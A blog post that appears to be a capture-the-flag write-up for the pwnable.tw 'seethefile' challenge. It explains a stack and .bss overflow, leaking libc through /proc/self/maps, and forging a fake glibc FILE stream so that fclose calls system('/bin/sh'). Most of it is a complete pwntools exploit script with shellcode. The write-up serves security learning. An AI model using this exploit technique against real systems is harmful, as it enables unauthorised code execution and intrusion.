---
layout: post
title:  "Pwnable.tw - seethefile"
date:   2025-01-23 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## seethefile

```bash
$ checksec ./seethefile
[*] '/home/itay/projects/pwnable_tw/seethefile/seethefile'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8047000)
    Stripped:   No

$ file ./seethefile
./seethefile: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=04e6f2f8c85fca448d351ef752ff295581c2650d, not stripped
```

Nearly no mitigations, 32 bit, libc-2.23, which is pretty old. Seems easy.

## Overview

Menu based challenge, having the options of `open, read, write, close, exit`. \
The challenge prompts that we can open everything, but questions if we would be able to read it. So the hardening should be at the read phase somewhere. 

1. The menu options are read via `scanf("%s", ptr)` into a buffer of size `0x20`. There's clear stack overflow vuln here. Moreover, the usage of `atoi` enables us to write nearly-arbitrary content into that buffer, and still make sure it parses correctly. So this is linear-stack overflow primitive, of non-null characters. 

2. The `exit` handler is interesting. It asks for a name, also via `scanf("%s")`, into a `.bss` buffer - `name`. This is another vuln, this time allowing linear overwrite at the `.bss`. Right after the `name` buffer within the `.bss`, a global `fp` resides. Upon exit, `fclose(fp)` is being issued. Hence, this challenge might involve understanding of the `fclose` file stream implementation, as we might want to use it for our branch primitive. 

3. `openfile` - memsets an interesting, large `magicbuf` (which may hold our fake file stream..), reads arbitrary filename, verifies it doesn't contains the `"flag"` keyword, and opens it via `fopen` to `r` (not read-bytes) mode. Notice - it may be interesting to open `/proc/self/maps`, as it would allow us arbitrary read primitive. 

4. The `readfile` handler calls `fread` off the file pointer `fp`, into the large `magicbuf`. It reads a maximum of `0x18f` bytes. 

5. The `writefile` handler simply prints the `magicbuf` into `stdout` via `puts`. (So it is more like the continuation of `readfile`, and not a real file-write primitive).


## Exploitation 

### Read Primitive

Notice we can open a file as many times as we'd like to. Moreover, we can perform `readfile + writefile` infinite amount of times. This means that by opening `/proc/self/maps`, we can parse the whole memory mappings, having any leak we'd need. Notice we can also parse the `auxv`, to retrieve the canary easily. 

### Write Primitive

My idea is simple - use the name-write vuln in order to overwrite the global `fp`, such that it would point into a buffer we control. For example, `magicbuf`. By doing so, we can fake a file stream object, potentially with a different handler for `fclose`. \
The question is - how can we populate the `magicbuf` with any content we'd like? A cool linux trick is to read off `/proc/self/fd/0` - meaning directly from the stdin device file. Hence, the call of `fread("/proc/self/fd/0", "r")` would read the desired `0x18f` bytes into the `magicbuf`. 

By reading glibc-2.23 sources, I've recalled that `fclose` is just another alias for `_IO_new_fclose`. 
We have to make sure few criterias are made, in order to reach the close path. \
For example, we have to set the `fp` such that its `lock` member is pointing to `NULL`. A cool trick we can do, instead of setting a pointer to `NULL`, is to set the `_IO_USER_LOCK` flag. 

## Solution

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10200
context.arch='i386'
context.os = 'linux'
context.endian = 'little'
BINARY = './seethefile'
LIBC = './libc_32.so.6'
LD = './ld-2.23.so'

GDB_SCRIPT = '''
b *0x8048b0f
commands
    p "gonna call fclose on overwritten stream"
end

c
'''

SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00
'''

# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
OFFSET_TO_BIN_SH = 0x0e

def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def chunkSize(alloc_size):
    assert(alloc_size >= 0)
    min_size = alloc_size + SIZEOF_PTR
    res = min_size % (2 * SIZEOF_PTR)
    pad = (2 * SIZEOF_PTR) - res if res else 0
    return min_size + pad

def allocSize(chunkSize):
    assert((chunkSize & 0xf) == 0)
    return chunkSize - SIZEOF_PTR

def recvPointer(p):
    leak = p.recv(SIZEOF_PTR)
    assert(len(leak) == SIZEOF_PTR)
    leak = u32(leak)
    assert(leak > 0x10000)
    return leak

###### Constants ######
IS_DEBUG = False
IS_REMOTE = True 
SIZEOF_PTR = 4
MAGIC_BUF_SIZE = 0x190
NAME_SIZE = 0x20
IO_USER_LOCK = 0x8000
IO_UNBUFFERED = 0x2

###### Offsets ######

###### Addresses ######
binary = ELF(BINARY)
main_binary = binary.symbols['main']
puts_got = binary.got['puts']
puts_plt = binary.plt['puts']
atoi_got = binary.got['atoi']
atoi_plt = binary.plt['atoi']
magicbuf = binary.symbols['magicbuf']

libc = ELF(LIBC)
bin_sh_libc = next(libc.search(b'/bin/sh'))
system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']
environ_libc = libc.symbols['environ']

libc_rop = ROP(LIBC)
pop_eax_ret = libc_rop.eax.address
pop_ebx_ret = libc_rop.ebx.address
pop_ecx_ret = libc_rop.ecx.address
pop_edx_ret = libc_rop.edx.address
leave_ret = libc_rop.find_gadget(['leave']).address
int_80 = libc_rop.find_gadget(['int 0x80']).address


def open_file(p, filename):
    p.sendline(b'1')
    p.recvuntil(b'What do you want to see :')
    p.sendline(filename)
    p.recvuntil(b'Your choice :')

def read_file(p, to_flush=True):
    p.sendline(b'2')
    if to_flush:
        p.recvuntil(b'Your choice :')

def write_file(p):
    p.sendline(b'3')
    data = p.recv(MAGIC_BUF_SIZE)
    p.recvuntil(b'Your choice :')
    return data

def close_file(p):
    p.sendline(b'4')
    p.recvuntil(b'Your choice :')

def exit_program(p, name):
    p.sendline(b'5')
    p.recvuntil(b'Leave your name :')
    p.sendline(name)
    p.recvuntil(b'see you next time\n')

def fetch_libc_file(p):
    open_file(p, b'/lib32/libc-2.23.so')
    content = b''
    for _ in range(1000):
        read_file(p)
        content += write_file(p)

    log.info(f'CONTENT: {content}')

def leak_libc(p):
    open_file(p, b'/proc/self/maps')
    memory_maps = b''
    for _ in range(3):
        read_file(p)
        memory_maps += write_file(p)

    libc_base = 0
    for line in memory_maps.splitlines():
        log.info(f'LINE: {line}')
        if b'libc' in line and (line.endswith(b'.so.6') or line.endswith(b'.so')) and not libc_base:
            libc_base = int(line[:8], 16)
    close_file(p)

    return libc_base

def write_fake_stream(p, libc_base):
    fake_stream = p32(0xfbad0000 | IO_USER_LOCK | IO_UNBUFFERED) 
    # Store 'sh' string at nearly start of the chunk, such that system("\xff\xff\xff\xff;sh\x00") would be issued
    fake_stream += b';/bin/sh;\x00\x00\x00'
    # Set all pointers to nulls, and make sure vtable_offset(0x46) is also 0
    fake_stream += b'\x00' * 0x38
    # Just some dereference-able address (lock)
    fake_stream += p32(magicbuf) 
    # Pad up to the vtable
    fake_stream += b'\x00' * (0x94 - len(fake_stream))
    # Vtable address
    fake_stream += p32(magicbuf + 0xe0)
    # Vtable content
    fake_stream += p32(libc_base + system_libc) * 36
    # Pad
    fake_stream += b'B' * (MAGIC_BUF_SIZE - len(fake_stream) - 1)
    open_file(p, b'/proc/self/fd/0')
    read_file(p, to_flush=False)
    p.sendline(fake_stream)
    p.recvuntil(b'Your choice :')

def overwrite_fp_and_trigger_fclose(p):
    buf = b'A' * NAME_SIZE 
    buf += p32(magicbuf)
    exit_program(p, buf)

def exploit(p):
    p.recvuntil(b'Your choice :')

    libc_base = leak_libc(p)
    log.info(f'libc_base: {hex(libc_base)}')

    write_fake_stream(p, libc_base)
    log.info(f'Overwrote magicbuf')

    overwrite_fp_and_trigger_fclose(p)
    log.info(f'Triggered fclose')


def main():
    if IS_DEBUG:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

Notice my solution doesn't calls `_IO_file_close_it`, but uses the finish's function pointers. 

